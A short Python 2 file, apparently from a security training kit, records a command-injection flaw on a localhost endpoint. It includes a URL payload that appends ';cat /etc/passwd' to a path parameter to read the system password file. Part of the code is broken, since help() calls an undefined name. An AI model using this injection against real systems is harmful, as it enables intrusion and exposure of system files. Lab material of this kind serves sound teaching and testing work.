__author__ = 'sec15334'

from Utils import Flaw as fl
from Utils import FieldSolution as fs
from Utils import MethodHelp as mh

def help():
    fileman = mh('fielmanager','Command inject')
    print loginhelp.print_help()

def fielmanager():
    flaw = fl('command inject','http://localhost:8081/secu/admininternpic.secu','Command injection')
    field1 = fs('uri','Not validated','http://localhost:8081/secu/admininternpic.secu?path=/etc/passwd;cat%20/etc/passwd')
    flaw.fields.append(field1)
    return flaw.printFlaw()